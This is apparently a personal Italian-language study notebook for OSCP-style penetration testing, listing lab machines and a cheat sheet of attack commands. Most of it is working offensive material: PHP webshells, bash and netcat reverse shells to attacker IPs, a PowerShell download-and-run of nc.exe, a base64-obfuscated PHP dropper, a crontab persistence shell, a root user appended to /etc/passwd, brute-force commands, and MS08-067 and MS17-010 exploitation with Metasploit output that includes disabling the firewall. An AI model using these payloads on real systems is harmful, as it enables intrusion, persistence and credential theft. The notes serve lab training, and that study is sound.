
**SE DOVESSI AVERE PROBLEMI CON LA SHARED FOLDER, ESEGUI QUESTO COMANDO**
vmhgfs-fuse .host:/ /mnt/hgfs/ -o allow_other -o uid=1000 

E poi trovi la cartella /nmt/hgfs/shared


#### TryeHackMe - Offensive Path:
(Scadenza 3/05/2021)
- Advanced Exploitation
	- <s>Game Zone</s>
	- <s>Skynet</s> -- possibile articolo
	- <s>Daily Bugle</s>
	- <s>Overpass 2 - Hacked</s>
	- <s>Relevant</s>
	- <s>Internal</s> -- possibile articolo (Port Forwarding)

- Buffer Overflow Exploitation
	- Buffer Overflow Prep
	- <s>Brainstorm</s>
	- <s>Gatepeeker</s>
	- <s>Brainpan 1</s>

- Active Directory
	- <s>Active Directory Basics</s>
 	- Attacking Kerberos
 	- Attacktive Directory
 	- <s>Post-Exploitation Basics</s>

 - Extra Credits
 	- Hacking with Powershell
 	- Corp
 	- <s>Mr Robot CTF</s>
 	- <s>Retro</s>



#### Vulnhub:
Beginner friendly
   - <s>Kioptrix: Level 1</s>
   - <s>Kioptrix: Level 1.1</s>
   - <s>Kioptrix: Level 1.2</s>
   - <s>Kioptrix: Level 1.3</s>
   - <s>FristiLeaks 1.3</s>
   - <s>Stapler 1</s>
   - <s>PwnLab: Init</s>
Intermediate
   - <s>Kioptrix: 2014</s>
   - <s>Brainpan: 1</s>
   - <s>Mr-Robot: 1</s>
   - <s>HackLAB: Vulnix</s>


   - VulnOS 2
   - SickOS 1.2
   - /dev/random:scream
   - pWnOS 2.0
   - SkyTower 1
   - IMF
   - Metasploitable 3
   - Lin. Security
   - Temple of Doom
   - Pinkys Palace v1
   - Pinkys Palace v2
   - Zico2
   - Wintermute
   - Lord of root 1.0.1
   - Tr0ll 1
   - Tr0ll 2
   - Web Developer 1
   - SoliState
 
   - OSCP (https://www.vulnhub.com/entry/infosec-prep-oscp,508/)
 

https://zayotic.com/posts/oscp-like-vulnhub-vms/


https://www.offensive-security.com/labs/individual/

#### Proving Grounds:
Windows
   - <s>Slort</s>
   - <s>Algernon</s> (magari rifare)
   - <s>Authby</s>
   - <s>Jacko</s>
   - <s>UT99</s> (rifare)
   - <s>MedJed</s> (era difficile, se vuoi rifarlo)
   - <s>MeatHead</s>
   - <s>Nickel</s>
   - Billyboss

Linux
   - <s>ClamAV</s>
   - <s>Wombo</s>
   - <s>Payday</s>
   - <s>Nibbles</s>
   - <s>Fail</s>
   - <s>Zino</s>
   - <s>Banzai</s>
   - <s>Hunit</s>
   - <s>Dibble</s> (rifare)
   - <s>Hetemit</s>
Other
   - <s>Bratarina</s>
   - <s>Internal</s>
   - Clyde
   - Shifty
   - Vector



#### Hack The Box:
- Linux
	- Lame
	- brainfuck
	- shocker
	- bashed
	- nibbles
	- beep
	- _cronos_
	- nineveh
	- _sense_
	- solidstate
	- kotarak
	- node
	- valentine
	- poison
	- sunday
	- tartarsauce

- Windows
	- legacy
	- Blue
	- Devel
	- Optimum
	- Bastard
	- granny
	- Artic
	- grandpa
	- silo
	- bounty
	- jerry

- Other
	- _Jeeves (Windows)_
	- Bart (Windows)
	- Tally (WIndows)
	- Active (Windows)
	- Jail (Linux)
	- falafel (Linux)
	- Devops (Linux)
	- Hawk (Linux)



Exam Prep
Your Practice Environment:
Buffer Overflow Machine (25 Points)
Jeeves (25 Points)
Chatterbox (20 Points)
Cronos (20 Points)
Sense (10 Points)





#### Macchine HTB/Vulnhub/Proving Grounds:
	https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit#gid=1839402159



#### Articoli da Leggere:
https://www.netsecfocus.com/oscp/2019/03/29/The_Journey_to_Try_Harder-_TJNulls_Preparation_Guide_for_PWK_OSCP.html
https://www.exploit-db.com/papers/42556
https://hacktips.it/guida-privilege-escalation-sistemi-windows/
https://hacktips.it/guida-privilege-escalation-sistemi-linux/

Windows Task Scheduled

Librotto

https://foxglovesecurity.com/2017/08/25/abusing-token-privileges-for-windows-local-privilege-escalation/
https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt

Reverse shell explain:
https://www.hackingtutorials.org/networking/hacking-netcat-part-2-bind-reverse-shells/


Github resources:
https://github.com/ferreirasc/oscp




SMB
Buffer Overflow
Privilege Escalation
	Windows
	Linux

Windows Task Scheduled

Port Forwarding
SSH Tunneling



Grep


Privilege Escalation:
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md

Windows Kernel Exploit:
https://github.com/SecWiki/windows-kernel-exploits/




WinPEAS:
https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe


### RPCDUMP
└─$ python /opt/impacket/examples/rpcdump.py 192.168.128.127


### URL Encode-Decode
https://www.url-encode-decode.com/


### Diffie-Hellman (SSH)
-oKexAlgorithms=+diffie-hellman-group1-sha1

### Mingw Linux
https://stackoverflow.com/questions/15986715/how-do-i-invoke-the-mingw-cross-compiler-on-linux

I binari sono:

- gcc-mingw-w64-x86-64
- g++-mingw-w64-x86-64
- binutils-mingw-w64-x86-64
- mingw-w64-x86-64-dev
- gcc-mingw-w64-i686
- g++-mingw-w64-i686
- binutils-mingw-w64-i686
- mingw-w64-i686-dev

Quindi, per esempio:
```
(base) ┌──(kali㉿kali)-[~/Documents/ProvingGrounds/Dibble]
└─$ /usr/bin/x86_64-w64-mingw32-gcc privesc.c -l ws2_32 -o bd.exe
```

### Php (simple-backdoor)

Nel seguente path c'è uno script php che non fa altro che creare una webshell con cui interagire tramite il parametro **cmd** in get nell'url:
/usr/share/webshells/php/simple-backdoor.php

Per esempio:
http://192.168.114.46:242/simple-backdoor.php?cmd=whoami


### Creare utente root da inserire in /etc/passwd (Linux)
```
echo "root2:AK24fcSx2Il3I:0:0:root:/root:/bin/bash" >> /etc/passwd
```
Le credenziali saranno quindi root2:evil

Per creare quella password, basta eseguire:
```
student@debian:~$ openssl passwd evil
AK24fcSx2Il3I
```

### NmapAutomator
Da root:
```
└─# ./nmapAutomator.sh -H 192.168.128.127 -t Port 

└─# ./nmapAutomator.sh -H 192.168.128.127 -t Full 

└─# ./nmapAutomator.sh -H 192.168.128.127 -t Vulns                 
```

### Find passwrdo in registri (Windows)
```
C:\Users\Public>reg query HKLM /f pass /t REG_SZ /s
[...]

HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control
    CurrentPass    REG_SZ    TwilightAirmailMuck234

[...]
```

### Crontab
cat /etc/crontab

```
# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *  * * * root    cd / && run-parts --report /etc/cron.hourly
25 6  * * * root  test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6  * * 7 root  test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6  1 * * root  test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*/3 * * * *   root    python /var/www/html/booked/cleanup.py
```
L'ultima linea significa che quel file verrà eseguito **ogni 3 minuti**.

https://howto.webarea.it/linux/utilizzo-di-crontab-per-schedulare-processi-con-esempi-sotto-linux_1


### Writable folder (Linux)
```
find / -writable -type d 2>/dev/null
```

### Armageddon - HTB
mysql -u drupaluser -pPASSWORD -e 'show databases;'
mysql -u drupaluser -pPASSWORD -D drupal -e 'show tables;'
mysql -u drupaluser -pPASSWORD -D drupal -e 'select * from users;'
mysql -u drupaluser -pPASSWORD -D drupal -e 'select name,pass from users;'

mysql -u john -phiroshima -e 'SHOW VARIABLES LIKE "%version%";'



python windows-exploit-suggester.py --database <xls database  of exploits provided with the script> --systeminfor <systeminfo saved in a txt file> --ostext <Os> -l


TryHackMe - Retro (altro privilege escalation molto interessante):
https://muirlandoracle.co.uk/2020/01/06/retro-write-up/


### Hydra
└─$ Wordpress
```
hydra -l elliot -P fsocity.dic 192.168.1.192 -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F192.168.1.192%2Fwp-admin%2F&testcookie=1:F=is incorrect'
```

└─$ SSH
(In questo caso sto facendo bruteforce sul nome dell'utente)
```
hydra -L users.txt -p "plbkac" 192.168.1.14 -t 4 ssh
```

└─$ FTP
```
hydra -l admin -P ~/Documents/rockyou.txt -e nsr -f ftp://192.168.114.46
```
└─$ RDP
```
hydra -t 1 -V -f -l ALICE -P /usr/share/seclists/Passwords/Common-Credentials/common-passwords-win.txt rdp://10.11.1.5
```

### SSH Bruteforce
Hydra
```
kali@kali:~$ hydra -L users.txt -P users.txt -e nsr -q ssh://192.168.120.85 -t 4 -w 5 -f
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-03-25 09:00:39
[DATA] max 4 tasks per 1 server, overall 4 tasks, 4 login tries (l:1/p:4), ~1 try per task
[DATA] attacking ssh://192.168.120.85:22/
[22][ssh] host: 192.168.120.85   login: patrick   password: patrick
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-03-25 09:00:40
```

Medusa
```
kali@kali:~$ medusa -h 192.168.120.85 -U users.txt -P users.txt -M ssh -e ns -f -g 5 -r 0 -b -t 2 -v 4
ACCOUNT FOUND: [ssh] Host: 192.168.120.85 User: patrick Password: patrick [SUCCESS]
```

Ncrack
```
kali@kali:~$ ncrack 192.168.120.85 -U users.txt -P users.txt -p ssh -f -v

Starting Ncrack 0.7 ( http://ncrack.org ) at 2020-03-25 09:03 EDT

Discovered credentials on ssh://192.168.120.85:22 'patrick' 'patrick'
ssh://192.168.120.85:22 finished.

Discovered credentials for ssh on 192.168.120.85 22/tcp:
192.168.120.85 22/tcp ssh: 'patrick' 'patrick'

Ncrack done: 1 service scanned in 3.01 seconds.
Probes sent: 1 | timed-out: 0 | prematurely-closed: 0

Ncrack finished.
```


### Gobuster
```
gobuster dir -u http://192.168.199.47 -w /usr/share/seclists/Discovery/Web-Content/common.txt -x txt,sql,bck,html,php,phtml,asp -b 404 -k
```

### Download - Linux
Se non c'è nè wget nè curl:
https://unix.stackexchange.com/questions/83926/how-to-download-a-file-using-just-bash-and-nothing-else-no-curl-wget-perl-et

```
/usr/bin/printf 'GET /26368.c \n' | nc 192.168.1.125 80 > exp.c
```


### Apache
FreeBSD
	/usr/local/etc/apache22/httpd.conf


### Altri file di log:
/var/log/sendmail.st.0
/root/.history
/var/log/httpd-access.log
/var/log/httpd-error.log
/usr/local/ossec-hids/logs/alerts/alerts.log
/var/log/messages
/var/log/lpd-errs
/var/log/auth.log
/var/log/maillog
/var/log/security
/var/log/userlog
/var/log/xferlog
/var/log/cron
/var/log/sendmail.st
/var/log/utx.lastlogin
/var/log/utx.log
/var/log/ppp.log
/var/log/debug.log



### Reverse shell php:
<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/'10.8.80.159'/4444 0>&1'\");?>

<?php system($_GET['cmd']); ?>


### Php + Powershell (Windows):
<?php system("powershell -Command \"& {(New-Object System.Net.WebClient).DownloadFile('http://10.8.80.159/nc.exe','nc.exe'); cmd /c nc.exe 10.8.80.159 4444 -e cmd.exe\" }"); ?>

#### windows-php-reverse-shell
https://github.com/Dhayalanb/windows-php-reverse-shell/blob/master/Reverse%20Shell.php
```
<?php
header('Content-type: text/plain');
$ip   = "192.168.1.9"; //change this 
$port = "1234"; //change this
$payload = "7Vh5VFPntj9JDklIQgaZogY5aBSsiExVRNCEWQlCGQQVSQIJGMmAyQlDtRIaQGKMjXUoxZGWentbq1gpCChGgggVFWcoIFhpL7wwVb2ABT33oN6uDm+tt9b966233l7Z39779/32zvedZJ3z7RO1yQjgAAAAUUUQALgAvBEO8D+LBlWqcx0VqLK+4XIBw7vhEr9VooKylIoMpVAGpQnlcgUMpYohpVoOSeRQSHQcJFOIxB42NiT22xoxoQDAw+CAH1KaY/9dtw+g4cgYrAMAoQEd1ZPopwG1lai2v13dDI59s27M2/W/TX4zhwru9Qi9jem/4fTfbwKt54cB/mPZagIA5n+QlxCT5PnaOfm7BWH/cn37UJ7Xv7fxev+z/srjvOF5/7a59rccu7/wTD4enitmvtzFxhprXWZ0rHvn3Z0jVw8CQCEVZbgBwCIACBhqQ5A47 ....
$evalCode = gzinflate(base64_decode($payload));
$evalArguments = " ".$port." ".$ip;
$tmpdir ="C:\\windows\\temp";
chdir($tmpdir);
$res .= "Using dir : ".$tmpdir;
$filename = "D3fa1t_shell.exe";
$file = fopen($filename, 'wb');
fwrite($file, $evalCode);
fclose($file);
$path = $filename;
$cmd = $path.$evalArguments;
$res .= "\n\nExecuting : ".$cmd."\n";
echo $res;
$output = system($cmd);	            
?>
```

### Spawn an interactive shell 
python -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/sh")'

python -c 'import pty; pty.spawn("cmd.exe")'

### Nikto
nikto -h $IP

### Rsync
List folder:
```
(base) ┌──(kali㉿kali)-[~/Documents/ProvingGrounds/Fail]
└─$ sudo nmap -sV --script "rsync-list-modules" -p 873 192.168.199.126
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-10 10:06 EDT
Nmap scan report for 192.168.199.126
Host is up (0.20s latency).

PORT    STATE SERVICE VERSION
873/tcp open  rsync   (protocol version 31)
| rsync-list-modules: 
|_  fox             fox home
```

Download contenuto folder:
```
(base) ┌──(kali㉿kali)-[~/Documents/ProvingGrounds/Fail]
└─$ rsync -av rsync://192.168.199.126:873/fox ./rsyn_shared
receiving incremental file list
created directory ./rsyn_shared
./
.bash_history -> /dev/null
.bash_logout
.bashrc
.profile

sent 87 bytes  received 4,828 bytes  1,966.00 bytes/sec
total size is 4,562  speedup is 0.93
```

Upload file:
```
(base) ┌──(kali㉿kali)-[~/Documents/ProvingGrounds/Fail]
└─$ rsync -av test.txt rsync://fox@192.168.199.126:873/fox 
sending incremental file list
test.txt

sent 102 bytes  received 35 bytes  54.80 bytes/sec
total size is 0  speedup is 0.00
```


### Fail2Ban
https://www.digitalocean.com/community/tutorials/how-fail2ban-works-to-protect-services-on-a-linux-server

I file di configurazione in /etc/fail2ban:
```
fox@fail:/etc/fail2ban$ ls -la
total 72
drwxr-xr-x  6 root root      4096 Dec  3  2020 .
drwxr-xr-x 76 root root      4096 Jan 21 13:43 ..
drwxrwxr-x  2 root fail2ban  4096 Dec  3  2020 action.d
-rw-r--r--  1 root root      2334 Jan 18  2018 fail2ban.conf
drwxr-xr-x  2 root root      4096 Sep 23  2018 fail2ban.d
drwxr-xr-x  3 root root      4096 Dec  3  2020 filter.d
-rw-r--r--  1 root root     22910 Nov 19  2020 jail.conf
drwxr-xr-x  2 root root      4096 Dec  3  2020 jail.d
-rw-r--r--  1 root root       645 Jan 18  2018 paths-arch.conf
-rw-r--r--  1 root root      2827 Jan 18  2018 paths-common.conf
-rw-r--r--  1 root root       573 Jan 18  2018 paths-debian.conf
-rw-r--r--  1 root root       738 Jan 18  2018 paths-opensuse.conf
```

In jail.conf ci sono le definizioni dei file che deve considerare, per esempio:
```
[...]

# Default banning action (e.g. iptables, iptables-new,
# iptables-multiport, shorewall, etc) It is used to define
# action_* variables. Can be overridden globally or per
# section within jail.local file
banaction = iptables-multiport
banaction_allports = iptables-allports

[...]
```

In questo caso c'è come banaction il l'azione iptables-multiport che corrisponde al file iptables-multiport.conf nella cartella action.d.
Siccome, per esempio, vorrei eseguire codice utilizzando questo servizio e visto che posso modificare i file di conf delle azioni, e siccome ho visto che nel file jail.conf c'è "enabled = true" al servizio SSH, potrei modificare il file iptables-multiport.conf mettendo come azione quando banna (sezione **actionban**) un comando per creare la reverse shell. Così poi fallisco il login in ssh più volte e scateno l'azione di ban definita nel file:

```
fox@fail:/etc/fail2ban/action.d$ cat iptables-multiport.conf 
# Fail2Ban configuration file
#
# Author: Cyril Jaquier
# Modified by Yaroslav Halchenko for multiport banning
#

[INCLUDES]

before = iptables-common.conf

[Definition]

# Option:  actionstart
# Notes.:  command executed once at the start of Fail2Ban.
# Values:  CMD
#
actionstart = <iptables> -N f2b-<name>
              <iptables> -A f2b-<name> -j <returntype>
              <iptables> -I <chain> -p <protocol> -m multiport --dports <port> -j f2b-<name>

# Option:  actionstop
# Notes.:  command executed once at the end of Fail2Ban
# Values:  CMD
#
actionstop = <iptables> -D <chain> -p <protocol> -m multiport --dports <port> -j f2b-<name>
             <actionflush>
             <iptables> -X f2b-<name>

# Option:  actioncheck
# Notes.:  command executed once before each actionban command
# Values:  CMD
#
actioncheck = <iptables> -n -L <chain> | grep -q 'f2b-<name>[ \t]'

# Option:  actionban
# Notes.:  command executed when banning an IP. Take care that the
#          command is executed with Fail2Ban user rights.
# Tags:    See jail.conf(5) man page
# Values:  CMD
#
actionban = nc 192.168.49.114 80 -e /bin/bash
#<iptables> -I f2b-<name> 1 -s <ip> -j <blocktype>

# Option:  actionunban
# Notes.:  command executed when unbanning an IP. Take care that the
#          command is executed with Fail2Ban user rights.
# Tags:    See jail.conf(5) man page
# Values:  CMD
#
actionunban = <iptables> -D f2b-<name> -s <ip> -j <blocktype>
```

Ovviamente questo è possibile se si può riavviare il servizio fail2ban così da ricaricare i file di conf. In questo esempio, veniva restartato ogni minuto il servizio.

##### Persistenza

Però se il riavvio è automatico (per esempio ogni minuto) si potrebbe perdere la reverse shell, per la PERSISTENZA quindi si può mettere come azione di ban:
```
echo "*  *  *  *  * root nc 192.168.118.5 4444 -e /usr/bin/bash" >> /etc/crontab
```

Così si crea un cron job che crea la reverse shell e non si perde più la reverse shell.


### Redis
$ redis-cli -h 10.10.239.36 -p 6379

Per fare una reverse shell:
https://book.hacktricks.xyz/pentesting/6379-pentesting-redis


10.10.239.36:6379> config set dir /var/www/html
OK
10.10.239.36:6379> config set dbfilename shell.php
OK
10.10.239.36:6379> set test "<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/'10.8.80.159'/4444 0>&1'\");?>"
OK
10.10.239.36:6379> save
OK


In questo caso, essendoci un server apache sulla 80 ho potuto accederci tramite:
https://10.10.239.36/shell.php


##### Redis 4.x/5.x RCE
Con MSF: linux/redis/redis_replication_cmd_exec

Con exploit GITHUB: https://github.com/vulhub/redis-rogue-getshell

Già scaricato in **~/Programs** ed eseguire:

```
sudo python3 redis-master.py -r 192.168.199.69 -p 6379 -L 192.168.49.199 -P 6379 -f RedisModulesSDK/exp.so -c "/usr/bin/python2.7 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.49.199\",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'"
```


### Netdiscover:
netdiscover -i eth0



### Samba / smbclient:

Per vedere i workgroup:
└─$ nmblookup -A 192.168.1.104
Looking up status of 192.168.1.104
	KIOPTRIX        <00> -         B <ACTIVE> 
	KIOPTRIX        <03> -         B <ACTIVE> 
	KIOPTRIX        <20> -         B <ACTIVE> 
	..__MSBROWSE__. <01> - <GROUP> B <ACTIVE> 
	MYGROUP         <00> - <GROUP> B <ACTIVE> 
	MYGROUP         <1d> -         B <ACTIVE> 
	MYGROUP         <1e> - <GROUP> B <ACTIVE> 

	MAC Address = 00-00-00-00-00-00




Se dovesse uscire l'errore:

protocol negotiation failed: NT_STATUS_IO_TIMEOUT


Bisogna settargli la versione minima del protocollo aggiungendo:
--option='client min protocol = NT1'
oppure 
modificare il file **/etc/samba/smb.conf** aggiungendo nella sezione "[global]" "client min protocol = NT1" e riavviare samba con il comando ```sudo service smbd restart```


Per vedere invece la versione, si può sniffare il traffico e poi eseguire smbclient e il pacchetto con Info "Session Setup AndX Response" ci dà la versione, per esempio "Samba 2.2.1a"
Ci sarebbe anche lo script smb-ver.sh ma non è molto affidabile (pare)


Enumerazione NetBIOS usando nmap:

```
$ nmap -sC --script=smb-enum-users $IP

Starting Nmap 7.40 ( https://nmap.org ) at 2016-12-29 02:37 CST
Nmap scan report for 192.168.1.14
Host is up (0.00096s latency).
Not shown: 566 closed ports, 430 filtered ports
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
MAC Address: 00:0C:29:8B:97:53 (VMware)

Host script results:
| smb-enum-users: 
|   KIOPTRIX4\john (RID: 3002)
|     Full name:   ,,,
|     Flags:       Normal user account
|   KIOPTRIX4\loneferret (RID: 3000)
|     Full name:   loneferret,,,
|     Flags:       Normal user account
|   KIOPTRIX4\nobody (RID: 501)
|     Full name:   nobody
|     Flags:       Normal user account
|   KIOPTRIX4\robert (RID: 3004)
|     Full name:   ,,,
|     Flags:       Normal user account
|   KIOPTRIX4\root (RID: 1000)
|     Full name:   root
|_    Flags:       Normal user account


Nmap done: 1 IP address (1 host up) scanned in 2.85 seconds
```


Escaping Restricted Linux Shells
https://www.sans.org/blog/escaping-restricted-linux-shells/
https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf

```
john:~$ echo os.system('/bin/bash')
```

### SMB 
```
└─$ nmap -v -p 139,445 --script=smb-vuln-ms* --script-args=unsafe=1 10.11.1.5     
    PORT    STATE SERVICE
    139/tcp open  netbios-ssn
    445/tcp open  microsoft-ds
    
    Host script results:
    | smb-vuln-ms08-067: 
    |   VULNERABLE:
    |   Microsoft Windows system vulnerable to remote code execution (MS08-067)
    |     State: VULNERABLE
    |     IDs:  CVE:CVE-2008-4250
    |           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
    |           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
    |           code via a crafted RPC request that triggers the overflow during path canonicalization.
    |           
    |     Disclosure date: 2008-10-23
    |     References:
    |       https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
    |_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
    |_smb-vuln-ms10-054: ERROR: Script execution failed (use -d to debug)
    |_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND
    | smb-vuln-ms17-010: 
    |   VULNERABLE:
    |   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
    |     State: VULNERABLE
    |     IDs:  CVE:CVE-2017-0143
    |     Risk factor: HIGH
    |       A critical remote code execution vulnerability exists in Microsoft SMBv1
    |        servers (ms17-010).
    |           
    |     Disclosure date: 2017-03-14
    |     References:
    |       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
    |       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
    |_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
    
    NSE: Script Post-scanning.
    Initiating NSE at 11:49
    Completed NSE at 11:49, 0.00s elapsed
    Read data files from: /usr/bin/../share/nmap
    Nmap done: 1 IP address (1 host up) scanned in 20.92 seconds
```

#### ms08-067

https://github.com/andyacer/ms08_067

We substitute the payload:
```
     ------------------------------------------------------------------------
    # REPLACE THIS SHELLCODE with shellcode generated for your use
    # Note that length checking logic follows this section, so there's no need to count bytes or bother with NOPS.
    #
    # Example msfvenom commands to generate shellcode:
    # msfvenom -p windows/shell_bind_tcp RHOST=10.11.1.229 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
    # msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.157 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
    # msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.157 LPORT=62000 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
    
    # Reverse TCP to 10.11.0.157 port 62000:
    shellcode= ( 
  SOSTIURI QUI!!!
    )
```

We use msfvenom to generate the payload:
```
    └─$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.168 LPORT=4444 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
```
We set a listener on the port 4444 and we run the script:
```
    python3 ms08_067_2018.py 10.11.1.5 1 443 
```
We use the argument “1” because the OS is Windows XP SP0/SP1 Universal and in the script there was indicate the code for the different OS:
```
    print ('\nUsage: %s <target ip> <os #> <Port #>\n' % sys.argv[0])
    print ('Example: MS08_067_2018.py 192.168.1.1 1 445 -- for Windows XP SP0/SP1 Universal, port 445')
    print ('Example: MS08_067_2018.py 192.168.1.1 2 139 -- for Windows 2000 Universal, port 139 (445 could also be used)')
    print ('Example: MS08_067_2018.py 192.168.1.1 3 445 -- for Windows 2003 SP0 Universal')
    print ('Example: MS08_067_2018.py 192.168.1.1 4 445 -- for Windows 2003 SP1 English')
    print ('Example: MS08_067_2018.py 192.168.1.1 5 445 -- for Windows XP SP3 French (NX)')
    print ('Example: MS08_067_2018.py 192.168.1.1 6 445 -- for Windows XP SP3 English (NX)')
    print ('Example: MS08_067_2018.py 192.168.1.1 7 445 -- for Windows XP SP3 English (AlwaysOn NX)')
```
```
└─$ sudo nc -lnvp 4444
```

#### MS09_050
cve 2009-3103
https://www.exploit-db.com/exploits/40280


### MS17-010 
windows/remote/42315.py

```
    (base) ┌──(kali㉿kali)-[~/Documents/OSCP/Bruce]
    └─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.168 LPORT=4444  -f exe > shell.exe
```

E quando l'ho usato, ho modificato questa funzione per eseguire l'upload del file:
We use the script 42315.py only for upload the file because seems that doesn't run other command. Also we modify the code:
```
    def smb_pwn(conn, arch):
    	smbConn = conn.get_smbconnection()
    	
    	print('creating file c:\\pwned.txt on the target')
    	#tid2 = smbConn.connectTree('C$')
    	#fid2 = smbConn.createFile(tid2, '/shell.exe')
    	#smbConn.closeFile(tid2, fid2)
    	#smbConn.disconnectTree(tid2)
    	
    	smb_send_file(smbConn, '/home/kali/Documents/OSCP/Bruce/shell.exe', 'C', '/shell.exe')
    
    
    	# Note: there are many methods to get shell over SMB admin session
    	# a simple method to get shell (but easily to be detected by AV) is
    	# executing binary generated by "msfvenom -f exe-service ..."
```
with **smb_send_file** we can upload the file.

E poi eseguo:
```
python 42315.py 10.11.1.75
```

Per eseguirlo invece ho usato metasploit:

To execute the script, we use the metasploit module **admin/smb/ms17_010_command**, but first we first disable the firewall:
```
    msf6 auxiliary(admin/smb/ms17_010_command) > set COMMAND "NetSh Advfirewall set allprofiles state off"
    COMMAND => NetSh Advfirewall set allprofiles state off
    msf6 auxiliary(admin/smb/ms17_010_command) > run
    
    [*] 10.11.1.75:445        - Target OS: Windows 8.1 Enterprise 9600
    [*] 10.11.1.75:445        - Built a write-what-where primitive...
    [+] 10.11.1.75:445        - Overwrite complete... SYSTEM session obtained!
    [+] 10.11.1.75:445        - Service start timed out, OK if running a command or non-service executable...
    [*] 10.11.1.75:445        - Getting the command output...
    [*] 10.11.1.75:445        - Executing cleanup...
    [+] 10.11.1.75:445        - Cleanup was successful
    [+] 10.11.1.75:445        - Command completed successfully!
    [*] 10.11.1.75:445        - Output for "NetSh Advfirewall set allprofiles state off":
    
    Ok.
    
    
    
    [*] 10.11.1.75:445        - Scanned 1 of 1 hosts (100% complete)
    [*] Auxiliary module execution completed
```

And then we run the payload (we first set a listener):
```
    [*] Auxiliary module execution completed
    msf6 auxiliary(admin/smb/ms17_010_command) > set COMMAND "C:\\shell.exe"
    COMMAND => C:\shell.exe
    msf6 auxiliary(admin/smb/ms17_010_command) > run
    
    [*] 10.11.1.75:445        - Target OS: Windows 8.1 Enterprise 9600
    [*] 10.11.1.75:445        - Built a write-what-where primitive...
    [+] 10.11.1.75:445        - Overwrite complete... SYSTEM session obtained!
    [+] 10.11.1.75:445        - Service start timed out, OK if running a command or non-service executable...
    [-] 10.11.1.75:445        - Unable to get handle: The server responded with error: STATUS_SHARING_VIOLATION (Command=45 WordCount=0)
    [-] 10.11.1.75:445        - Command seems to still be executing. Try increasing RETRY and DELAY
    [*] 10.11.1.75:445        - Getting the command output...
    [*] 10.11.1.75:445        - Command finished with no output
    [*] 10.11.1.75:445        - Executing cleanup...
    [+] 10.11.1.75:445        - Cleanup was successful
    [+] 10.11.1.75:445        - Command completed successfully!
    [*] 10.11.1.75:445        - Output for "C:\shell.exe":
```

Però volendo si può usare lo script python e usare la funzione **service_exec** per eseguire lo script che si carica, così si evita Metasploit.
Spiegazione:
https://null-byte.wonderhowto.com/how-to/manually-exploit-eternalblue-windows-server-using-ms17-010-python-exploit-0195414/

### MySQL

Se trovi un mysql con accesso di root, puoi sfruttare la vuln nota MySQL UDF
In questo link https://www.exploit-db.com/exploits/46249 MySQL User-Defined (Linux) x32 / x86_64 sys_exec function local privilege escalation exploit

Prima devi vedere se MySQL sta eseguendo con privilegi di root:

$ ls -la /usr/lib/lib_mysqludf_sys.so 
-rw-rw-rw- 1 root root 12896 2012-02-04 10:08 /usr/lib/lib_mysqludf_sys.so


Poi puoi sfruttare la vuln: (In questo caso si danno i privilegi di admin all'utente john) https://lifesfun101.github.io/2019/09/05/kioptrix-1.3-walkthrough.html
```
john@Kioptrix4:/var/www$ mysql -h localhost -u root -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 105
Server version: 5.0.51a-3ubuntu5.4 (Ubuntu)

